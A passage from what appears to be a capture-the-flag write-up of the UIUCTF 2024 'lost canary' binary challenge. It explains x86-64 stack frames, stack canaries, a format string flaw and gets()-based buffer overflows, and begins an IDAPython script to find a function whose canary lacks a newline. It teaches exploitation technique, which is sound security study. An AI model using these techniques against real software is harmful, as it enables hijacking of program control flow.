&lt;p&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x = &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y = &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Assume find_sum() is defined somewhere in the program */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    find_sum(x, y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;At the line of the call to  &lt;code&gt;find_sum()&lt;/code&gt; , the stack would have some values (these depend on the compiler you are using, but not of our concern anyways - what we are bothered with is the top and base pointers). Let us see the stack right &lt;em&gt;before&lt;/em&gt; the call to  &lt;code&gt;find_sum()&lt;/code&gt; :&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-3.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;(&lt;strong&gt;Note&lt;/strong&gt;: The  &lt;code&gt;rsp&lt;/code&gt;  and  &lt;code&gt;rbp&lt;/code&gt;  only &lt;em&gt;point&lt;/em&gt; to the top and bottom, they do not contain the values at the bottom/top of the stack - those can be gotten by dereferencing these pointers)&lt;/p&gt;
&lt;p&gt;So, the next line is our function call, let us see what happens.&lt;/p&gt;
&lt;p&gt;First off, every function call is translated into assembly as a  &lt;code&gt;call&lt;/code&gt;  instruction, which transfers control flow to a different part of the code.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# something like this&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov rdi, 5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov rsi, 7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call find_sum&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# remaining instructions in the program &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov eax, 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;We can see that there are also instructions after the call instruction, so once the different part of the code finishes executing, control flow would need to return to the next instruction ( &lt;code&gt;mov eax, 0&lt;/code&gt; , in our case).&lt;/p&gt;
&lt;p&gt;Luckily for us, we have a register which tracks the address of the next instruction:  &lt;code&gt;rip&lt;/code&gt; . Let us use that.&lt;/p&gt;
&lt;p&gt;To store  &lt;code&gt;rip&lt;/code&gt;  temporarily, we can push it onto the stack.&lt;/p&gt;
&lt;p&gt;The  &lt;code&gt;call&lt;/code&gt;  instruction in  &lt;code&gt;x86-64&lt;/code&gt;  is actuall abstracted into 2 separate instructions:  &lt;code&gt;push rip&lt;/code&gt;  and  &lt;code&gt;jmp rip&lt;/code&gt; , so the control flow of our program is transferred there.&lt;/p&gt;
&lt;p&gt;Currently, our stack looks like this:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-4.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now, what Intel does here is interesting.&lt;/p&gt;
&lt;p&gt;First, the old &lt;em&gt;value&lt;/em&gt; of  &lt;code&gt;rbp&lt;/code&gt;  is pushed onto the stack&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-5.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now that the old  &lt;code&gt;rbp&lt;/code&gt;  value is safe, the current top, is set as the new base (i.e,  &lt;code&gt;rsp&lt;/code&gt;  and  &lt;code&gt;rbp&lt;/code&gt;  now contain the same values, effectively pointing to the same address).&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-7.png&#34; alt=&#34;alt text&#34; /&gt;&lt;br /&gt;
And now, the stack for the new function is set up! The function is free to use its frame however it pleases (as long as it does not use up all the stack space allocated by the OS!).&lt;/p&gt;
&lt;p&gt;If we had to put what I just showed in pictures and translate it to assembly, it would look a little something like this:&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# save the old value of rbp on the stack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push rbp &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# rbp = rsp, effectively setting the new &amp;quot;base&amp;quot; to the previous &amp;quot;top&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov rbp, rsp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Now, logically, returning from a function would follow the opposite steps as setting up a stack frame for a function.&lt;/p&gt;
&lt;p&gt;First, the stack top pointer is brought down to the current base (opposite of what happened for setting up)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-8.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Next, the top value on the stack (which was the old base pointer) is popped into  &lt;code&gt;rbp&lt;/code&gt; . This effectively moves the base pointer back to where it previously was.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-9.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Next, the top value on the stack (which was the old value of  &lt;code&gt;rip&lt;/code&gt; ), is popped into  &lt;code&gt;rip&lt;/code&gt;  (this is abstracted as the instruction:  &lt;code&gt;ret&lt;/code&gt; ).&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-10.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;And that&#39;s how it&#39;s done!&lt;/p&gt;
&lt;p&gt;This is how you can use just 2 pointers to effectively have however many stack frames you want (1 per function).&lt;/p&gt;
&lt;p&gt;Now, back to the challenge 😃&lt;/p&gt;
&lt;h2 id=&#34;analysis-continued&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#analysis-continued&#34;&gt;#&lt;/a&gt; Analysis: continued&lt;/h2&gt;
&lt;p&gt;The  &lt;code&gt;-fno-stack-protector&lt;/code&gt;  turns off the option to add a stack protection mechanism known as the &amp;quot;stack cookie&amp;quot; or the &amp;quot;stack canary&amp;quot;. Why does the stack need protection, though?&lt;/p&gt;
&lt;p&gt;Well, we have seen that, during a function call, the stack stores 2 critical values: the old base pointer ( &lt;code&gt;rbp&lt;/code&gt; ) and the return address from where code flow needs to continue after the function call ( &lt;code&gt;rip&lt;/code&gt; ). What if I can overwrite these values?&lt;/p&gt;
&lt;p&gt;What if there are some library functions (for example:  &lt;code&gt;gets&lt;/code&gt; ), which use the stack as a buffer to store the value we give it, but do not perform any bound/size checks, and will accept any length of input and place it as it is on the stack?  &lt;code&gt;gets&lt;/code&gt;  is one such example of a library function which does not care about the size of the input you give it, it will eat up as many characters as you give it.&lt;/p&gt;
&lt;p&gt;This effectively means I can overwrite the  &lt;code&gt;rip&lt;/code&gt;  with whatever value I want, meaning I control the flow of execution of the program going forward.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-11.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;A stack canary is a kind of boundary wall that is used to prevent such attacks. It is a random value that is generated each time the program is run, and placed between the old  &lt;code&gt;rbp&lt;/code&gt;  and any value(s) the function uses the stack for storing. So the new stack looks a little something like this:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-12.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The value of this canary is checked to see if it it was overwritten with something else. If it is not what it&#39;s supposed to be, the program simply exits. It is difficult (but not impossible in some cases), to beat this.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-13.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Next up,  &lt;code&gt;-Wno-deprecated-declarations&lt;/code&gt;  - this just tells the compiler to keep quiet and not warn about any deprecated function(s) we might be using in our program.&lt;/p&gt;
&lt;h2 id=&#34;step-2-program-analysis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#step-2-program-analysis&#34;&gt;#&lt;/a&gt; Step 2: Program Analysis&lt;/h2&gt;
&lt;p&gt;Before we try running the program, we need to make sure the binary is patched to refer to the linker and libc that we have been given in the handout. Luckily, there is a very handy tool for doing just this: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2lvMTIvcHduaW5pdA==&#34;&gt;pwninit&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;Just install and run  &lt;code&gt;pwninit&lt;/code&gt;  from the challenge directory and it will do the patching for you, and will generated a separate patched file, with the needed changes.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-14.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This is what we get from running the binary a couple of times, let us open it up in IDA.&lt;/p&gt;
&lt;p&gt;Immediately, we can see a bunch of  &lt;code&gt;station_&amp;lt;number&amp;gt;&lt;/code&gt;  functions, probably the function that gets called based on the station number we input, and it gets there using a  &lt;code&gt;jmp&lt;/code&gt;  table. You can tell this because of the  &lt;code&gt;__asm &amp;#123; jmp     rax &amp;#125;&lt;/code&gt;  that IDA has placed in the pseudocode. You can recover any jump table in IDA if you notice this by following this &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXgtcmF5cy5jb20vYmxvZy9pZ29ycy10aXAtb2YtdGhlLXdlZWstNTMtbWFudWFsLXN3aXRjaC1pZGlvbXMv&#34;&gt;blog&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;In the  &lt;code&gt;select_station&lt;/code&gt;  function itself, we can see there is a call to  &lt;code&gt;printf&lt;/code&gt;  with the input that we give to the program. This is a format string vulnerability.&lt;/p&gt;
&lt;h3 id=&#34;what-is-a-format-string-vulnerability&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#what-is-a-format-string-vulnerability&#34;&gt;#&lt;/a&gt; What is a format string vulnerability?&lt;/h3&gt;
&lt;p&gt;In assembly, there is something known as a &amp;quot;calling convention&amp;quot;. This refers to the places where any function looks at first when it is called, to know what arguments were passed to it.&lt;/p&gt;
&lt;p&gt;In  &lt;code&gt;x86-64&lt;/code&gt;  the calling convention is as follows:  &lt;code&gt;rdi&lt;/code&gt; ,  &lt;code&gt;rsi&lt;/code&gt; ,  &lt;code&gt;rdx&lt;/code&gt; ,  &lt;code&gt;rcx&lt;/code&gt; ,  &lt;code&gt;r8&lt;/code&gt; ,  &lt;code&gt;r9&lt;/code&gt; . If a function has more arguments than this, the stack is used for the remaining ones.&lt;/p&gt;
&lt;p&gt;This just means that, printf (and all other functions) will look at these registers in these order, followed by the stack to know what it has to print out to the console.&lt;/p&gt;
&lt;p&gt;Now in our program, the printf call is vulnerable because it does not inherently control how many values it prints out. Compare the following 2 printf calls:&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;printf(&amp;quot;%s&amp;quot;, arg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;printf(arg);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The first one is alright, because there is only 1 format specifier passed when  &lt;code&gt;printf()&lt;/code&gt;  is called, and we cannot change that, but the second one is vulnerable - in the sense, we can print out however many values we want, in whatever format we want.&lt;/p&gt;
&lt;p&gt;Before we get to exploiting this format string vulnerability, we also need to identify vulnerable functions, so how do we pick that?&lt;/p&gt;
&lt;h2 id=&#34;step-3-reversing&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#step-3-reversing&#34;&gt;#&lt;/a&gt; Step 3: Reversing&lt;/h2&gt;
&lt;p&gt;A little analysis shows us that there exist 3 different kind of functions, functions that:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Take ticket code through  &lt;code&gt;gets()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Take ticket code through  &lt;code&gt;fgets()&lt;/code&gt; , then use  &lt;code&gt;strcpy()&lt;/code&gt;  to copy it elsewhere&lt;/li&gt;
&lt;li&gt;Take ticket code through  &lt;code&gt;scanf()&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;All 3 have some or the other kind of BOF (buffer overflow) vulnerability, but there is one thing to keep in mind about each function here:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;gets()&lt;/code&gt;  stops taking input at the first newline ( &lt;code&gt;0xa&lt;/code&gt; )&lt;/li&gt;
&lt;li&gt;&lt;code&gt;scanf()&lt;/code&gt;  stops taking input at the first whitespace character in general&lt;/li&gt;
&lt;li&gt;&lt;code&gt;strcpy()&lt;/code&gt;  stops at the first null byte&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;(I kind of guessed that  &lt;code&gt;gets()&lt;/code&gt;  would be the vulnerable function, it as well as could have been any other, in which case my script can be easily modified, but oh well)&lt;/p&gt;
&lt;p&gt;Let us pick a random  &lt;code&gt;gets()&lt;/code&gt;  function and examine it.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-15.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Seems pretty straightforward, except one thing: a predefined stack canary is being loaded, not by the compiler. Meaning, we have all the stack canary values already, we would not need to spend timing finding/leaking it 😃&lt;/p&gt;
&lt;p&gt;Of course, the author would not want things to be this easy, so let us examine the canary as well&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__stack_chk_guard_10 = 0x456B0A4E4C74784F&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahh, there is a newline in there.&lt;/p&gt;
&lt;p&gt;This is an issue because, if we do end up exploiting the buffer overflow vulnerability in  &lt;code&gt;gets()&lt;/code&gt; , we would need to keep the canary intact so as to not have the program detect an overwrite and exit.&lt;br /&gt;
To do this, we would need to pass the canary as part of the input, and doing that would prematurely end the  &lt;code&gt;gets()&lt;/code&gt;  function since there is also a newline in the canary.&lt;/p&gt;
&lt;p&gt;Examining a couple more stations shows us that this is the case for every  &lt;code&gt;gets()&lt;/code&gt;  function so far, as well as  &lt;code&gt;scanf()&lt;/code&gt;  and  &lt;code&gt;strcpy()&lt;/code&gt;  functions&lt;/p&gt;
&lt;p&gt;So, we need to find a single function where this is not the case. For this, we can utilise IDA scripting with the IDAPython API.&lt;/p&gt;
&lt;p&gt;Here is the general idea:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Generate a list of all functions calling  &lt;code&gt;gets()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Generate a list of all stack canaries without a newline&lt;/li&gt;
&lt;li&gt;Compare to see if there are common functions between the two lists&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So let us write a script to do just that.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; idautils&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;find_xrefs_to&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;address&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    given an address, find all addresses calling that address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    xrefs = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ref &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; idautils.CodeRefsTo(address, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        xrefs.append(ref)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; xrefs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_stack_canaries&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    given the base address, generate a dictionary of in the format 